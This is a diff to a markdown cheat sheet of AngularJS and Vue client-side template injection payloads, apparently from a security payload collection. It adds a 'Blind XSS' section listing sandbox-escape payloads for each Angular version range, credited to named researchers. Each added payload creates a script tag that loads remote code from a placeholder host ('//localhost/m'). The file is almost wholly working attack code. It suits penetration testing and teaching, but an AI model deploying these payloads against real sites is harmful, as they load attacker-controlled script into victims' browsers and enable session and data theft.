@@ -1,5 +1,7 @@
 # XSS in Angular
 
+## Stored/Reflected XSS - Simple alert 
+
 > Angular as of version 1.6 have removed the sandbox altogether
 
 Angular 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
@@ -137,16 +139,116 @@ Angular 1.2.0 - 1.2.1
 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
 ```
 
-Angular 1.0.1 - 1.1.5
+Angular 1.0.1 - 1.1.5 and Vue JS
 
 ```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
 
-Vue JS
+
+## Blind XSS
+
+1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)
 
 ```javascript
-{{constructor.constructor('alert(1)')()}}
+{{
+    constructor.constructor("var _ = document.createElement('script');
+    _.src='//localhost/m';
+    document.getElementsByTagName('body')[0].appendChild(_)")()
+}}
+```
+
+
+Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)
+
+```javascript
+{{
+    $on.constructor("var _ = document.createElement('script');
+    _.src='//localhost/m';
+    document.getElementsByTagName('body')[0].appendChild(_)")()
+}}
+```
+
+1.2.0 - 1.2.5 by Gareth Heyes (PortSwigger)
+
+```javascript
+{{
+    a="a"["constructor"].prototype;a.charAt=a.trim;
+    $eval('a",eval(`var _=document\\x2ecreateElement(\'script\');
+    _\\x2esrc=\'//localhost/m\';
+    document\\x2ebody\\x2eappendChild(_);`),"')
+}}
+```
+
+1.2.6 - 1.2.18 by Jan Horn (Cure53, now works at Google Project Zero)
+
+```javascript
+{{
+    (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("
+        var _ = document.createElement(\'script\');
+        _.src=\'//localhost/m\';
+        document.getElementsByTagName(\'body\')[0].appendChild(_)")')()
+}}
+```
+
+1.2.19 (FireFox) by Mathias Karlsson
+
+```javascript
+{{
+    toString.constructor.prototype.toString=toString.constructor.prototype.call;
+    ["a",'eval("var _ = document.createElement(\'script\');
+    _.src=\'//localhost/m\';
+    document.getElementsByTagName(\'body\')[0].appendChild(_)")'].sort(toString.constructor);
+}}
+```
+
+1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger)
+
+```javascript
+{{
+    a="a"["constructor"].prototype;a.charAt=a.trim;
+    $eval('a",eval(`
+    var _=document\\x2ecreateElement(\'script\');
+    _\\x2esrc=\'//localhost/m\';
+    document\\x2ebody\\x2eappendChild(_);`),"')
+}}
+```
+
+1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger)
+
+```javascript
+{{
+    a=toString().constructor.prototype;a.charAt=a.trim;
+    $eval('a,eval(`
+    var _=document\\x2ecreateElement(\'script\');
+    _\\x2esrc=\'//localhost/m\';
+    document\\x2ebody\\x2eappendChild(_);`),a')
+}}
+```
+
+1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger)
+
+```javascript
+{{
+    a=toString().constructor.prototype;a.charAt=a.trim;
+    $eval('a,eval(`var _=document.createElement(\'script\');
+    _.src=\'//localhost/m\';document.body.appendChild(_);`),a')
+}}
+```
+
+1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero)
+
+```javascript
+{{
+    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;
+    c.$eval=b;op=$root.$$phase;
+    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+    B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\'script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};");
+    m1=B($$asyncQueue.pop().expression,null,$root);
+    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+    $eval('a(b.c)');[].push.apply=a;
+}}
 ```
 
 ## References
